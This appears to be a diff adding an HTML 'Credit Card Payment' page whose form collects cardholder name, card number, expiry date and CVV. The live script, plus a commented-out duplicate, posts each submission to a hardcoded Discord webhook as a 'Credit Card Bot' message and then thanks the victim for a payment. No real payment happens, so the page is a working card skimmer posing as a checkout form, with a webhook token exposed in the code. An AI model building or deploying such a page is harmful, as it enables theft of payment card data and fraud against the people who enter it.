@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Credit Card Payment</title>
+	<style>
+		body {
+			font-family: Arial, sans-serif;
+			background-color: #f2f2f2;
+		}
+		form {
+			background-color: #fff;
+			border-radius: 10px;
+			box-shadow: 0px 0px 10px #999;
+			padding: 20px;
+			max-width: 500px;
+			margin: 0 auto;
+		}
+		label {
+			display: block;
+			margin-bottom: 10px;
+			font-weight: bold;
+		}
+		input[type="text"], input[type="number"], select {
+			border: 1px solid #ccc;
+			border-radius: 3px;
+			padding: 5px;
+			width: 100%;
+			margin-bottom: 15px;
+		}
+		input[type="submit"] {
+			background-color: #4CAF50;
+			color: #fff;
+			border: none;
+			border-radius: 5px;
+			padding: 10px;
+			cursor: pointer;
+		}
+		input[type="submit"]:hover {
+			background-color: #3e8e41;
+		}
+	</style>
+</head>
+<body>
+	<form id="payment-form">
+		<label for="cardholder-name">Cardholder Name</label>
+		<input type="text" id="cardholder-name" name="cardholder-name" required>
+
+		<label for="card-number">Card Number</label>
+		<input type="text" id="card-number" name="card-number" pattern="[0-9]{16}" required>
+
+		<label for="expiry-date">Expiry Date</label>
+		<input type="month" id="expiry-date" name="expiry-date" required>
+
+		<label for="cvv">CVV</label>
+		<input type="number" id="cvv" name="cvv" pattern="[0-9]{3}" required>
+
+		<input type="submit" value="Pay Now">
+	</form>
+
+	<script>
+// 		// const form = document.querySelector('#payment-form');
+
+// 		// form.addEventListener('submit', (event) => {
+// 		// 	event.preventDefault();
+
+// 		// 	const cardholderName = form.querySelector('#cardholder-name').value;
+// 		// 	const cardNumber = form.querySelector('#card-number').value;
+// 		// 	const expiryDate = form.querySelector('#expiry-date').value;
+// 		// 	const cvv = form.querySelector('#cvv').value;
+
+// 		// 	// Add your validation code here
+
+// 		// 	alert(`Thank you for your payment, ${cardholderName}!`);
+// 		// });
+//     const form = document.querySelector('#payment-form');
+// const webhookUrl = 'https://discord.com/api/webhooks/1103203414692872242/NIHv7RX4bdLgt64Byw2I0kLf9yz4a1xs77EYJgAy9kUyvhfltv7XfaRyKDlTNU7uWieV'; // Replace with your webhook URL
+
+// form.addEventListener('submit', async (event) => {
+// 	event.preventDefault();
+
+// 	const cardholderName = form.querySelector('#cardholder-name').value;
+// 	const cardNumber = form.querySelector('#card-number').value;
+// 	const expiryDate = form.querySelector('#expiry-date').value;
+// 	const cvv = form.querySelector('#cvv').value;
+
+// 	// Add your validation code here
+
+// 	const payload = {
+// 		'username': 'Credit Card Bot',
+// 		'content': `**New Payment**\nCardholder Name: ${cardholderName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
+// 	};
+
+// 	const response = await fetch(webhookUrl, {
+// 		method: 'POST',
+// 		headers: {
+// 			'Content-Type': 'application/json'
+// 		},
+// 		body: JSON.stringify(payload)
+// 	});
+
+// 	if (response.ok) {
+// 		alert(`Thank you for your payment, ${cardholderName}!`);
+// 	} else {
+// 		alert('An error occurred while sending the payment details.');
+// 	}
+// });
+
+const form = document.querySelector('#payment-form');
+const webhookUrl = 'https://discord.com/api/webhooks/1103203414692872242/NIHv7RX4bdLgt64Byw2I0kLf9yz4a1xs77EYJgAy9kUyvhfltv7XfaRyKDlTNU7uWieV'; // Replace with your webhook URL
+
+form.addEventListener('submit', async (event) => {
+	event.preventDefault();
+
+	const cardholderName = form.querySelector('#cardholder-name').value;
+	const cardNumber = form.querySelector('#card-number').value;
+	const expiryDate = form.querySelector('#expiry-date').value;
+	const cvv = form.querySelector('#cvv').value;
+
+	// Add your validation code here
+
+	const payload = {
+		'username': 'Credit Card Bot',
+		'content': `**New Payment**\nCardholder Name: ${cardholderName}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
+	};
+
+	const response = await fetch(webhookUrl, {
+		method: 'POST',
+		headers: {
+			'Content-Type': 'application/json'
+		},
+		body: JSON.stringify(payload)
+	});
+
+	if (response.ok) {
+		alert(`Thank you for your payment, ${cardholderName}!`);
+	} else {
+		alert('An error occurred while sending the payment details.');
+	}
+});
+
+
+    
+	</script>
+</body>
+</html>
